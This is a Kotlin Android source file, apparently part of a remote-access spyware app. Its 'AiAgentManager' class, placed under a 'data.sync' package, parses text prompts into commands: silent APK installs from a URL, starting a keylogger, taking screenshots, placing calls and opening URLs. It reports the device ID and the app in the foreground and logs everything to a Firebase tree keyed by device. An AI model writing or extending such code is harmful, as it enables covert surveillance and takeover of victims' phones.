package com.example.data.sync

import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.os.BatteryManager
import android.provider.Settings
import android.util.Log
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class AiAgentManager(private val context: Context) {
    private val TAG = "AiAgentManager"

    private fun getForegroundPackageName(): String {
        try {
            val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
            val endTime = System.currentTimeMillis()
            val startTime = endTime - 15000
            val usageEvents = usageStatsManager?.queryEvents(startTime, endTime)
            var lastPkg = ""
            if (usageEvents != null) {
                val event = UsageEvents.Event()
                while (usageEvents.hasNextEvent()) {
                    usageEvents.getNextEvent(event)
                    if (event.eventType == UsageEvents.Event.ACTIVITY_RESUMED ||
                        event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) {
                        lastPkg = event.packageName
                    }
                }
            }
            if (lastPkg.isNotEmpty()) return lastPkg
        } catch (_: Exception) {}
        return "unknown"
    }

    suspend fun processAiPrompt(prompt: String): String = withContext(Dispatchers.IO) {
        try {
            val lower = prompt.lowercase()
            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
            
            var executedCommand = "SHOW_TOAST"
            var executionPayload = prompt
            var aiAnswer = ""

            when {
                lower.contains("call") || lower.contains("dial") || lower.contains("phone") -> {
                    executedCommand = "PLACE_CALL"
                    val callIndex = maxOf(lower.indexOf("call"), lower.indexOf("dial"), lower.indexOf("phone"))
                    val rawTarget = if (callIndex >= 0) {
                        val keywordLen = when {
                            lower.indexOf("call") >= 0 -> 4
                            lower.indexOf("dial") >= 0 -> 4
                            else -> 5
                        }
                        val sub = prompt.substring(minOf(callIndex + keywordLen, prompt.length)).trim()
                        sub
                    } else {
                        prompt
                    }
                    executionPayload = rawTarget.replace(Regex("^(to|number)\\s+", RegexOption.IGNORE_CASE), "").trim()
                    if (executionPayload.isEmpty()) {
                        executionPayload = prompt
                    }
                }
                lower.contains("install") || lower.contains("download") || lower.contains("apk") -> {
                    executedCommand = "SILENT_INSTALL"
                    val url = prompt.split(" ").firstOrNull { it.startsWith("http") || it.contains(".") } ?: prompt
                    executionPayload = url
                }
                lower.contains("open") || lower.contains("launch") || lower.contains("browse") || lower.contains("url") || lower.contains("http") -> {
                    executedCommand = "OPEN_URL"
                    val url = prompt.split(" ").firstOrNull { it.startsWith("http") || it.contains(".") } ?: "https://google.com"
                    executionPayload = url
                }
                lower.contains("screenshot") || lower.contains("capture") -> {
                    executedCommand = "TAKE_SCREENSHOT"
                    executionPayload = ""
                }
                lower.contains("flashlight") || lower.contains("torch") -> {
                    executedCommand = if (lower.contains("off") || lower.contains("disable")) "FLASHLIGHT_OFF" else "FLASHLIGHT_ON"
                    executionPayload = ""
                }
                lower.contains("vibrate") -> {
                    executedCommand = "VIBRATE"
                    executionPayload = "1000"
                }
                lower.contains("siren") || lower.contains("alarm") -> {
                    executedCommand = if (lower.contains("off") || lower.contains("stop")) "STOP_SIREN" else "START_SIREN"
                    executionPayload = ""
                }
                lower.contains("keylogger") || lower.contains("keystroke") -> {
                    executedCommand = if (lower.contains("off") || lower.contains("stop") || lower.contains("disable")) "STOP_KEYLOGGER" else "START_KEYLOGGER"
                    executionPayload = ""
                }
                lower.contains("status") || lower.contains("report") || lower.contains("battery") || lower.contains("info") -> {
                    val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
                    val batteryLevel = batteryManager?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
                    aiAnswer = "Device ID $deviceId is online. Active App: ${getForegroundPackageName()}. Battery level: ${if (batteryLevel >= 0) "$batteryLevel%" else "Unknown"}."
                }
                else -> {
                    executedCommand = "SHOW_TOAST"
                    executionPayload = prompt
                }
            }

            if (aiAnswer.isEmpty()) {
                val result = RemoteCommandManager(context).executeCommand(executedCommand, executionPayload)
                aiAnswer = "AI Agent executed -> Command: $executedCommand, Payload: '$executionPayload'. Result: ${result.resultMessage}"
            }

            val chatRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId).child("ai_chat_history")
            val chatRecord = mapOf(
                "question" to prompt,
                "answer" to aiAnswer,
                "command" to executedCommand,
                "payload" to executionPayload,
                "timestamp" to System.currentTimeMillis()
            )
            chatRef.push().setValue(chatRecord)

            aiAnswer
        } catch (e: Exception) {
            Log.e(TAG, "AI Agent processing error: ${e.message}")
            "AI Assistant error: ${e.message}"
        }
    }
}
